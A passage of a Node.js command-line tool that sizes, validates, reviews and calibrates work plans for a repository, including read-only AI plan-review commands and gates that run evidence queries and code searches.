    else if (a === "--issues") o.issues = argv[++i];
    else if (a === "--out") o.out = argv[++i];
    else if (a === "--actuals") o.actuals = argv[++i];
    else if (a === "--repo-root") o.repoRoot = argv[++i];
    else if (a === "--label") o.label = argv[++i];
    else if (a === "--date") o.date = argv[++i];
    else if (a.startsWith("--")) o[a.slice(2)] = argv[++i];
    else if (!o.subcommand) o.subcommand = a;
    else o.rest.push(a);
  }
  return o;
}

export function usage() {
  return [
    `prep-runner — deterministic plumbing for /prep-for-work (size, split, validate, budget, calibrate).`,
    ``,
    `Usage: node prep-runner.mjs <subcommand> [flags]`,
    ``,
    `  size --surfaces <a,b> [--core N] [--extra-files N] [--extra-additions N]`,
    `        Size one issue against this repo's real fan-out. Prints expected files/additions, version`,
    `        axes, whether it busts the ${PLAN_BUDGET.files}-file/${PLAN_BUDGET.additions}-addition budget, and how to split it.`,
    `  surfaces [--verify --repo-root <p>]   list the fan-out table; --verify re-checks every path exists`,
    `  scaffold --issues DER-1,DER-2 [--label L] [--out plan.json]   empty plan skeleton`,
    `  validate <plan.json>                  gate the run; exit 1 if the plan is not dispatchable`,
    `  budget-for <plan.json> <DER-id>       the ASSIGNED budget for one unit (bundles summed)`,
    `  render <plan.json> [--out plan.md]    human-readable run plan`,
    `  calibrate <plan.json> --actuals <actuals.json>   planned vs delivered; recalibrate the table`,
    ``,
    `  plan-review <plan.json> <DER-id> [--repo-root <p>] [--out-dir <d>]`,
    `        MANDATORY pre-run gate. Prints the plan-review prompt + the exact \`codex exec\` command to`,
    `        run it. Reviewing the PLAN pre-empts the findings the cloud reviewer would write against the`,
    `        eventual PR — a plan edit costs one re-brief; the same finding on a PR costs a review round.`,
    `  plan-review-record <plan.json> <DER-id> --review <out.json> --log <codex.jsonl> [--out plan.json]`,
    `        Fold an accepted review in as watchOuts + planReview. REFUSES a run that never completed or`,
    `        never searched the repo (command_execution=0 returns fabricated findings — DER-2504).`,
    ``,
    `  mutation-check <plan.json> [id] [--require-observed] [--record]`,
    `        GROUNDING GATE 1 (refuses in validate). Every declared check (issues[].checks: [{name,`,
    `        mutation, observedFailure}]) must name the exact edit that makes it FAIL. --require-observed`,
    `        additionally demands the recorded OBSERVED failure (post-implementation; described is not`,
    `        observed). --record folds the observe-the-failure AC into notes, which the brief carries.`,
    `  query-check <plan.json> [id] [--repo-root <p>] [--record] [--out <plan.json>]`,
    `        GROUNDING GATE 2 (refuses in validate). RUNS every evidenceQueries[] entry ({name, query,`,
    `        window, expectAtLeast} — plan-level or per-issue) and fails any that exits nonzero, is`,
    `        killed, or returns fewer than its known-positive floor. Exit status is checked FIRST: output`,
    `        alone is never a pass, so a failed run counts 0 — fail-closed. Counting: a pipeline whose`,
    `        LAST stage is grep -c / rg -c / wc -l reached by a pipe (or a one-stage query of the same`,
    `        shape) counts by NUMBER when stdout is a single bare integer; everything else counts`,
    `        non-empty stdout lines. --record stamps the observed count AND whether the run failed;`,
    `        validate refuses unstamped, failed and under-floor queries.`,
    `  symbol-check <plan.json> [id] [--repo-root <p>] [--record] [--out <plan.json>]`,
    `        GROUNDING GATE 3 (refuses in validate). Resolves every issues[].symbols[] ({name, from, use?})`,
    `        target as exported / private / not-found. A private call/test target is a RE-SCOPE, not an`,
    `        export (the test-binds-symbol rule); use:"edit" permits private. --record stamps resolutions.`,
    `  priorart-check <plan.json> [id] [--repo-root <p>] [--record] [--out <plan.json>]`,
    `        GROUNDING GATE 4 (advisory — warns in validate, never refuses, never cuts an issue). Sweeps`,
    `        (rg, grep fallback) tests and guards for prior art already asserting what an issue proposes to add; reports`,
    `        candidates for HUMAN judgement. --record stamps priorArt; record your call in priorArt.disposition.`,
    ``,
    `Surfaces: ${Object.keys(SURFACES).join(", ")}`,
    `Risk lanes: ${RISK_LANES.join(", ")}  (high: ${[...HIGH_RISK_LANES].join(", ")})`,
  ].join("\n");
}

const readJson = async (p) => JSON.parse(await readFile(resolve(p), "utf8"));

export async function runSubcommand(argv) {
  const o = parseArgs(argv);
  switch (o.subcommand) {
    case "size": {
      const est = sizeIssue({
        surfaces: o.surfaces ? o.surfaces.split(",").map((s) => s.trim()).filter(Boolean) : [],
        coreUnits: Number.isFinite(o.core) ? o.core : 1,
        extraFiles: o.extraFiles,
        extraAdditions: o.extraAdditions,
      });
      if (o.json) return { stdout: JSON.stringify(est, null, 2), estimate: est };
      const lines = [
        `expectedFiles      ${est.expectedFiles}   (budget ${est.budget.files})`,
        `expectedAdditions  ${est.expectedAdditions}   (budget ${est.budget.additions})`,
        `expectedRounds     ~${est.expectedRounds}  (measured, by size bucket)`,
        `surfaces           ${est.surfaces.join(", ") || "—"}`,
        `versionAxes        ${est.versionAxes.join(", ") || "—"}`,
        `needsDocker        ${est.needsDocker}`,
        ``,
        est.overBudget
          ? `🔴 OVER BUDGET by ${Math.max(0, est.overBy.files)} files / ${Math.max(0, est.overBy.additions)} additions — split into ~${est.split.children} (${est.split.axis}).\n\n${est.split.how}`
          : `🟢 within budget — dispatch as one PR.`,
      ];
      return { stdout: lines.join("\n"), estimate: est, exitCode: est.overBudget ? 2 : 0 };
    }
    case "surfaces": {
      if (o.verify) {
        const v = await verifySurfacePaths(o.repoRoot ?? process.cwd());
        const out = v.results.map((r) => `${r.ok ? "ok  " : "MISS"} ${r.surface.padEnd(16)} ${r.path}`).join("\n");
        return { stdout: `${out}\n\n${v.ok ? "🟢 fan-out table matches the repo" : `🔴 ${v.missing.length} path(s) moved — FIX THE TABLE, a rotted table under-sizes silently`}`, exitCode: v.ok ? 0 : 1 };
      }
      const out = Object.entries(SURFACES).map(([k, s]) =>
        `${k.padEnd(16)} ${String(s.files).padStart(2)} files  ${String(s.additions).padStart(4)} adds  ${s.axes.length ? `axes: ${s.axes.join(",")}  ` : ""}${s.note}`).join("\n");
      return { stdout: `${out}\n\ncore unit = ${CORE_UNIT.files} files / ${CORE_UNIT.additions} additions` };
    }
    case "scaffold": {
      const plan = scaffoldPlan({
        issues: (o.issues ?? "").split(",").map((s) => s.trim()).filter(Boolean),
        label: o.label ?? null,
        date: o.date ?? null,
        specRef: o["spec-ref"] ?? o.specRef ?? null,
        tracking: o.tracking ?? null,
        units: Number.parseInt(o.units ?? "0", 10) || 0,
      });
      const out = JSON.stringify(plan, null, 2);
      if (o.out) { await writeFile(resolve(o.out), `${out}\n`, "utf8"); return { stdout: resolve(o.out), plan }; }
      return { stdout: out, plan };
    }
    case "validate": {
      const plan = await readJson(o.rest[0] ?? o.plan);
      const res = validatePlan(plan);
      const lines = [];
      if (res.errors.length) lines.push(`🔴 ${res.errors.length} error(s) — this plan is NOT dispatchable:`, ...res.errors.map((e) => `  - ${e}`));
      if (res.warnings.length) lines.push(`🟠 ${res.warnings.length} warning(s):`, ...res.warnings.map((w) => `  - ${w}`));
      if (res.ok && !res.warnings.length) lines.push(`🟢 plan is dispatchable — ${plan.issues.length} units.`);
      else if (res.ok) lines.push(`🟢 dispatchable (with warnings) — ${plan.issues.length} units.`);
      return { stdout: lines.join("\n"), result: res, exitCode: res.ok ? 0 : 1 };
    }
    case "budget-for": {
      const plan = await readJson(o.rest[0] ?? o.plan);
      const id = o.rest[1] ?? o.issue;
      const b = budgetFor(plan, id);
      if (!b) return { stdout: `no assigned budget for ${id} in this plan`, exitCode: 1 };
      return { stdout: JSON.stringify(b, null, 2), budget: b };
    }
    case "render": {
      const plan = await readJson(o.rest[0] ?? o.plan);
      const md = renderPlanMd(plan);
      if (o.out) { await writeFile(resolve(o.out), md, "utf8"); return { stdout: resolve(o.out) }; }
      return { stdout: md.trimEnd() };
    }
    case "calibrate": {
      const plan = await readJson(o.rest[0] ?? o.plan);
      const actuals = await readJson(o.actuals);
      const c = calibrate(plan, Array.isArray(actuals) ? actuals : actuals.actuals ?? [], { run: o.run ?? (Array.isArray(actuals) ? null : actuals.run ?? null) });
      const rows = c.rows.map((r) => `${r.id.padEnd(10)} files ${r.plannedFiles}→${r.actualFiles} (${r.fileRatio}×)  additions ${r.plannedAdditions}→${r.actualAdditions} (${r.additionRatio}×)`);
      return {
        stdout: [...rows, ``, c.suggestion, ...(c.confirmsPrior ? [``, c.confirmsPrior.note] : [])].join("\n"),
        calibration: c,
      };
    }
    case "plan-review": {
      const planPath = resolve(o.rest[0] ?? o.plan);
      const plan = await readJson(planPath);
      const id = o.rest[1] ?? o.issue;
      const issue = (plan.issues ?? []).find((i) => i.id === id);
      if (!issue) throw new Error(`plan-review: ${id ?? "(no id given)"} is not in ${planPath}`);
      const repoRoot = resolve(o.repoRoot ?? process.cwd());
      const outDir = resolve(o["out-dir"] ?? o.outDir ?? join(repoRoot, "tmp", "plan-review"));
      const promptFile = join(outDir, `${id}.prompt.md`);
      const outFile = join(outDir, `${id}.review.json`);
      const logFile = join(outDir, `${id}.codex.jsonl`);
      const schemaFile = join(outDir, `${id}.schema.json`);
      const prompt = planReviewPrompt(issue, { repoRoot, corpus: plan.kickbackCorpus ?? [] });
      await mkdir(outDir, { recursive: true });
      await writeFile(promptFile, prompt, "utf8");
      await writeFile(schemaFile, JSON.stringify(PLAN_REVIEW_SCHEMA, null, 2), "utf8");
      const cmd = `cd ${JSON.stringify(repoRoot)} && codex exec --json --sandbox read-only ` +
        `--output-schema ${JSON.stringify(schemaFile)} --output-last-message ${JSON.stringify(outFile)} ` +
        `- < ${JSON.stringify(promptFile)} > ${JSON.stringify(logFile)} 2>&1`;
      return {
        stdout: [
          `Plan-review prompt written: ${promptFile}`,
          ``,
          `Run it (the checkout MUST have node_modules present, or the reviewer goes blind):`,
          cmd,
          ``,
          `Then record it — this REFUSES a run that died or never searched the repo:`,
          `node ${fileURLToPath(import.meta.url)} plan-review-record ${JSON.stringify(planPath)} ${id} --review ${JSON.stringify(outFile)} --log ${JSON.stringify(logFile)}`,
        ].join("\n"),
        promptFile, outFile, logFile, schemaFile, command: cmd,
      };
    }
    case "plan-review-record": {
      const planPath = resolve(o.rest[0] ?? o.plan);
      const plan = await readJson(planPath);
      const id = o.rest[1] ?? o.issue;
      const issue = (plan.issues ?? []).find((i) => i.id === id);
      if (!issue) throw new Error(`plan-review-record: ${id ?? "(no id given)"} is not in ${planPath}`);
      const logText = await readFile(resolve(o.log), "utf8").catch(() => "");
      const check = planReviewAccepted(logText);
      if (!check.accepted) {
        throw new Error(
          `REFUSING to record this plan review:\n${check.reasons.map((r) => `  - ${r}`).join("\n")}\n` +
          `  A refused review is the CORRECT outcome — recording it would write an empty watch-out list\n` +
          `  into the plan and read as "reviewed". Fix the gate and re-run it.`,
        );
      }
      const review = await readJson(o.review);
      applyPlanReview(issue, review, { model: o.model ?? "codex", commands: check.commands, sha: o.sha ?? null });
      const outPath = resolve(o.out ?? planPath);
      await writeFile(outPath, `${JSON.stringify(plan, null, 2)}\n`, "utf8");
      return {
        stdout: [
          `${id}: recorded ${issue.watchOuts.length} watch-out(s) — verdict "${issue.planReview.verdict}", ${check.commands} repo command(s) run.`,
          ...issue.watchOuts.map((w) => `  - [${w.severity}] ${w.class} → ${w.instruction}`),
          ...(issue.planReview.sizeChallenge ? [``, `Size challenge: ${issue.planReview.sizeChallenge}`] : []),
          ``,
          `Plan written: ${outPath}`,
        ].join("\n"),
        issue,
      };
    }
    case "mutation-check": {
      const planPath = resolve(o.rest[0] ?? o.plan);
      const plan = await readJson(planPath);
      const id = o.rest[1] ?? o.issue ?? null;
      const res = checkMutations(plan, id, { requireObserved: o.requireObserved });
      const lines = res.rows.map((r) => r.problems.length
        ? `🔴 ${r.id} checks[${r.index ?? "-"}]${r.name ? ` "${r.name}"` : ""}: ${r.problems.join(" · ")}`
        : `ok   ${r.id} "${r.name}"${o.requireObserved ? " — failure observed and recorded" : ""}`);
      if (!res.rows.length) lines.push(`no declared checks${id ? ` on ${id}` : ""} — nothing to gate. Declare them as issues[].checks: [{name, mutation, observedFailure}] so this gate can hold them.`);
      if (o.record) {
        let stamped = 0;
        for (const it of plan.issues ?? []) {
          if (id && it.id !== id) continue;
          const checks = (Array.isArray(it.checks) ? it.checks : []).filter((c) => c?.name && c?.mutation);
          if (!checks.length || it.notes?.includes(MUTATION_AC_MARKER)) continue;
          const block = mutationAcBlock(checks);
          it.notes = it.notes ? `${it.notes}\n\n${block}` : block;
          stamped += 1;
        }
        const outPath = resolve(o.out ?? planPath);
        await writeFile(outPath, `${JSON.stringify(plan, null, 2)}\n`, "utf8");
        lines.push(``, `${stamped} observe-the-failure AC block(s) folded into notes. Plan written: ${outPath}`);
      }
      lines.push(``, res.ok
        ? `🟢 every declared check names the mutation that makes it fail${o.requireObserved ? " AND records the observed failure" : ""}.`
        : `🔴 ${res.failures.length} ungrounded check(s) — a check that cannot fail is not evidence.`);
      return { stdout: lines.join("\n"), result: res, exitCode: res.ok ? 0 : 1 };
    }
    case "query-check": {
      const planPath = resolve(o.rest[0] ?? o.plan);
      const plan = await readJson(planPath);
      const id = o.rest[1] ?? o.issue ?? null;
      const repoRoot = resolve(o.repoRoot ?? process.cwd());
      const rows = collectEvidenceQueries(plan, id);
      if (!rows.length) return { stdout: `no evidence queries declared${id ? ` on ${id}` : ""} — nothing to gate. Declare them as evidenceQueries: [{name, query, window, expectAtLeast}] (plan-level or per-issue).`, exitCode: 0 };
      const lines = [];
      let failures = 0;
      for (const r of rows) {
        const label = `${r.id ?? "plan"} evidenceQueries[${r.index}]${r.q?.name ? ` "${r.q.name}"` : ""}`;
        // Re-checked here, not only in validate: this is the line that actually spawns, and it is
        // reachable directly (`query-check <plan>`) without validate ever having run. The refusal must
        // land BEFORE the spawn — after it, the payload has already run.
        const probs = [...evidenceQueryProblems(r.q), ...(r.q?.query?.trim?.() ? evidenceQueryShellProblems(r.q.query) : [])];
        if (probs.length) { failures += 1; lines.push(`🔴 ${label}: ${probs.join(" · ")}`); continue; }
        // Argv, not `shell: true` (DER-2836): a shell would expand the query a SECOND time, after the
        // checks above, and hand the command arguments none of them read.
        const run = runEvidenceQuery(r.q.query, { cwd: repoRoot, timeout: 60_000 });
        // Exit status FIRST — output alone is not a pass. `failed` is stamped alongside the count so
        // `validate` can refuse a blind pass rather than re-deriving one from a 0 it cannot interpret.
        const ev = evaluateQueryRun(run, r.q.expectAtLeast, r.q.query);
        r.q.observed = { count: ev.count, failed: ev.failed, at: new Date().toISOString() };
        if (ev.failed) { failures += 1; lines.push(`🔴 ${label}: ${ev.failure}`); }
        else if (!ev.ok) { failures += 1; lines.push(`🔴 ${label}: returned ${ev.count} < ${r.q.expectAtLeast} on its known-positive window (${r.q.window}) — the query is BLIND to the history it cites; fix the QUERY, not the floor`); }
        else lines.push(`ok   ${label}: ${ev.count} ≥ ${r.q.expectAtLeast} on ${r.q.window}`);
      }
      if (o.record) {
        const outPath = resolve(o.out ?? planPath);
        await writeFile(outPath, `${JSON.stringify(plan, null, 2)}\n`, "utf8");
        lines.push(``, `Observed counts stamped (failures too — validate stays honest about them). Plan written: ${outPath}`);
      }
      lines.push(``, failures
        ? `🔴 ${failures} evidence quer${failures === 1 ? "y" : "ies"} cannot reproduce the history it cites — each would have "confirmed" a clean state it cannot see (the 07-28 kill criterion matched 2 of its own 6 cited commits and would have auto-selected "delete the tool").`
        : `🟢 every evidence query returns on its known-positive window.`);
      return { stdout: lines.join("\n"), exitCode: failures ? 1 : 0 };
    }
    case "symbol-check": {
      const planPath = resolve(o.rest[0] ?? o.plan);
      const plan = await readJson(planPath);
      const id = o.rest[1] ?? o.issue ?? null;
      const repoRoot = resolve(o.repoRoot ?? process.cwd());
      const lines = [];
      let failures = 0;
      let declared = 0;
      for (const it of plan.issues ?? []) {
        if (id && it.id !== id) continue;
        for (const [si, s] of (Array.isArray(it.symbols) ? it.symbols : []).entries()) {
          declared += 1;
          const label = `${it.id} symbols[${si}]${s?.name ? ` "${s.name}"` : ""}`;
          const probs = symbolShapeProblems(s);
          if (probs.length) { failures += 1; lines.push(`🔴 ${label}: ${probs.join(" · ")}`); continue; }
          let src = null;
          try { src = await readFile(join(repoRoot, s.from), "utf8"); } catch { /* missing file — handled below */ }
          if (src == null) {
            s.resolved = { status: "not-found", at: new Date().toISOString() };
            failures += 1;
            lines.push(`🔴 ${label}: ${s.from} does not exist in the repo — the plan implies a file that is not there`);
            continue;
          }
          const status = classifySymbol(src, s.name);
          s.resolved = { status, at: new Date().toISOString() };
          const use = s.use ?? "test";
          if (status === "exported") lines.push(`ok   ${label}: exported from ${s.from}`);
          else if (status === "private" && use === "edit") lines.push(`ok   ${label}: private in ${s.from} — fine for an edit-in-place target`);
          else if (status === "private") { failures += 1; lines.push(`🔴 ${label}: PRIVATE in ${s.from} — the brief is unimplementable as a ${use} target as written. Re-scope to the public entry that reaches it; do NOT export it just so a test can import it (that is the shape AGENTS.md's test-binds-symbol rule rejects).`); }
          else { failures += 1; lines.push(`🔴 ${label}: NOT FOUND in ${s.from}`); }
        }
      }
      if (!declared) return { stdout: `no symbols declared${id ? ` on ${id}` : ""} — nothing to gate. Declare call/test targets as issues[].symbols: [{name, from, use?}].`, exitCode: 0 };
      if (o.record) {
        const outPath = resolve(o.out ?? planPath);
        await writeFile(outPath, `${JSON.stringify(plan, null, 2)}\n`, "utf8");
        lines.push(``, `Resolutions stamped. Plan written: ${outPath}`);
      }
      lines.push(``, failures
        ? `🔴 ${failures} unreachable target(s) — each is a full lead round burned discovering the brief cannot be implemented as written.`
        : `🟢 every named target exists and is reachable as planned.`);
      return { stdout: lines.join("\n"), exitCode: failures ? 1 : 0 };
    }
    case "priorart-check": {
      const planPath = resolve(o.rest[0] ?? o.plan);
      const plan = await readJson(planPath);
      const id = o.rest[1] ?? o.issue ?? null;
      const repoRoot = resolve(o.repoRoot ?? process.cwd());
      const lines = [];
      for (const it of plan.issues ?? []) {
        if (id && it.id !== id) continue;
        const terms = deriveSearchTerms(it);
        if (!terms.length) {
          lines.push(`—    ${it.id}: no searchable terms (give it notes, a title, or explicit priorArt.terms)`);
          if (o.record) it.priorArt = { terms: [], candidates: [], checkedAt: new Date().toISOString(), disposition: it.priorArt?.disposition ?? null };
          continue;
        }
        const seen = new Set();
        const candidates = [];
        // Prefer rg (gitignore-aware); fall back to grep — on some hosts "rg" is only an interactive
        // shell shim, invisible to spawnSync, and a sweep that silently found nothing because its
        // engine was missing would be this gate committing the exact sin it polices.
        const sweep = (cmd, args) => {
          const run = spawnSync(cmd, args, { cwd: repoRoot, encoding: "utf8", timeout: 60_000 });
          return run.error ? null : String(run.stdout ?? "");
        };
        for (const term of terms) {
          let out = sweep("rg", ["-in", "--no-heading", "-F", "-m", "2", "-g", "*.test.*", "-g", "*.db.test.*", "-g", "scripts/*", term, "."]);
          if (out == null) {
            const tests = sweep("grep", ["-rniFs", "-m", "2", "--include=*.test.*", "--include=*.db.test.*", "--exclude-dir=node_modules", "--exclude-dir=.git", term, "."]);
            const scripts = sweep("grep", ["-rniFs", "-m", "2", "--exclude-dir=node_modules", "--exclude-dir=.git", term, "scripts"]);
            out = tests == null && scripts == null ? null : `${tests ?? ""}\n${scripts ?? ""}`;
          }
          if (out == null) return { stdout: `priorart-check needs ripgrep (rg) or grep runnable from node — neither spawned`, exitCode: 1 };
          for (const line of out.split("\n").filter(Boolean).slice(0, 6)) {
            if (seen.has(line)) continue;
            seen.add(line);
            candidates.push({ term, match: line });
          }
          if (candidates.length >= 12) break;
        }
        if (o.record) it.priorArt = { terms, candidates: candidates.slice(0, 12), checkedAt: new Date().toISOString(), disposition: it.priorArt?.disposition ?? null };
        if (!candidates.length) lines.push(`ok   ${it.id}: no prior art found for [${terms.join(", ")}]`);
        else {
          lines.push(`🟠   ${it.id}: ${candidates.length} candidate(s) — JUDGE these; an existing test/guard may already assert what this issue proposes to add:`);
          for (const c of candidates.slice(0, 12)) lines.push(`       [${c.term}] ${c.match}`);
        }
      }
      if (o.record) {
        const outPath = resolve(o.out ?? planPath);
        await writeFile(outPath, `${JSON.stringify(plan, null, 2)}\n`, "utf8");
        lines.push(``, `Sweep stamped (existing dispositions preserved). Plan written: ${outPath}`);
      }
      lines.push(``, `🟢 advisory gate: candidates are for HUMAN judgement — this gate never cuts an issue (the JUDGEMENT, not the sweep, is what deletes work). Record your call in priorArt.disposition.`);
      return { stdout: lines.join("\n"), exitCode: 0 };
    }
    default:
      return { stdout: usage() };
  }
}

async function main() {
  const o = parseArgs(process.argv.slice(2));
  if (o.help || !o.subcommand) { console.log(usage()); return; }
  const res = await runSubcommand(process.argv.slice(2));
  if (res?.stdout != null) console.log(res.stdout);
  if (res?.exitCode) process.exitCode = res.exitCode;
}

const thisFile = fileURLToPath(import.meta.url);
if (process.argv[1] === thisFile) {
  main().catch((err) => { console.error(err instanceof Error ? err.message : String(err)); process.exit(1); });
}
